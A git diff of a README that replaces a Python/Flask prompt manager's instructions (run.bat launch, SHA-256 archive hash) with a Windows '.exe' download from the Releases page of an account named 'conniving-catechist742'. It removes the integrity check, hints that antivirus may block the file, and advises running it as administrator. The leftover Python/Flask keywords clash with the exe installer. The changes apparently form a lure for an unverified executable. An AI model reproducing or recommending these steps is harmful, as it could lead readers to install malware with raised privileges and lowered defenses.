@@ -1,28 +1,55 @@
-# PromptForge
+# 🤖 ai-prompt-studio - Organize prompts for better AI results
 
-> A local-first prompt manager for ChatGPT, Claude, Gemini, and any AI workflow.
+[![Download ai-prompt-studio](https://img.shields.io/badge/Download-ai-prompt-studio-blue.svg)](https://github.com/conniving-catechist742/ai-prompt-studio)
 
-[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-3.x-000000?logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
-[![License](https://img.shields.io/badge/License-MIT-22c55e)](LICENSE)
+## 📋 Project Overview
+ai-prompt-studio serves as a local manager for AI prompts. It stores your favorite text instructions for ChatGPT, Claude, and Gemini in one place. You gain control over your prompt library without relying on cloud services. The application keeps your data on your computer. This setup ensures privacy and fast access to your work.
 
-Create reusable prompts, organize them with tags, quickly find what you need, and keep your data on your own computer.
+## 🛠️ System Requirements
+Your computer must meet these basic needs to run the software:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Internet: A connection for initial updates and sync tasks.
 
-## Run on Windows
+## 📥 How to Download and Install
+Follow these steps to set up the application on your Windows machine:
 
-With Python 3.11+ installed, double-click `run.bat`. On the first launch it installs the required package, starts PromptForge in the background, and opens it in your browser after it is ready.
+1. Visit this page to download: https://github.com/conniving-catechist742/ai-prompt-studio
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the latest version link.
+4. Download the file ending in ".exe" to your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the instructions on the screen to finish the setup.
+7. Click the application icon on your desktop to launch the program.
 
-## Features
+## 🚀 Getting Started
+The first time you open the program, you see a blank library. You can add your first prompt by clicking the plus sign in the top corner. Provide a name for your prompt, paste the text into the box, and save it. You can tag your prompts by AI model type like ChatGPT or Claude to keep your workspace clean.
 
-- Generate and save prompts
-- Tags, search, favorites, and copy-to-clipboard
-- Download a local JSON backup
-- No account, API key, or cloud database required
+## 💡 Key Features
+* Local Storage: Your prompts stay on your hard drive. No third party holds your data.
+* Quick Search: Find any saved prompt in seconds using the search bar.
+* Model Compatibility: Organize instructions for any AI model you use.
+* Clean Interface: The layout removes distractions so you focus on writing.
+* Import and Export: Move your library to a new computer using a simple file export feature.
 
-## Archive verification
+## 🖥️ Using the Program
+The main window shows your list of prompts on the left. Click any item to see the full text and details. The edit button lets you change your prompts at any time. When you need a prompt, copy the text with the button at the bottom of the screen. You can then paste it directly into your AI chat window.
 
-Verify the published source archive before running it:
+## 🛡️ Privacy and Security
+This application saves data in a local database file. No tracking occurs. Your prompts never leave your machine unless you share them manually. You own your prompts and your workflow. The design prioritizes your control.
 
-- SHA-256: `7DF6008FD3AACDDC84B615886A0695D14F7B6BB5E901930F3329B990CCCD9FD0`
+## ❓ Troubleshooting
+If the application fails to open:
+* Check your antivirus software. It might block new programs.
+* Restart your computer. This clears temporary issues.
+* Make sure you installed the most recent version from the download page.
+* Run the file as an administrator if your user account has restrictions.
 
-This hash lets you independently verify that an archive matches the published source. A VirusTotal report link will be added only after a completed scan is available.
+## 🔧 Workflow Tips
+Create folders for different projects. Name your prompts clearly so you identify them at a glance. Use the tag feature to filter your list by purpose, such as "Coding," "Writing," or "Analysis." This habit saves time when you work with different AI tools during the day.
+
+## 📦 Maintenance
+The software checks for updates on startup. If an update appears, follow the download link again to receive the latest improvements. Your prompts remain safe during the update process.
+
+Keywords: ai-tools, chatgpt, claude, flask, gemini, local-first, productivity, prompt-engineering, prompt-manager, python
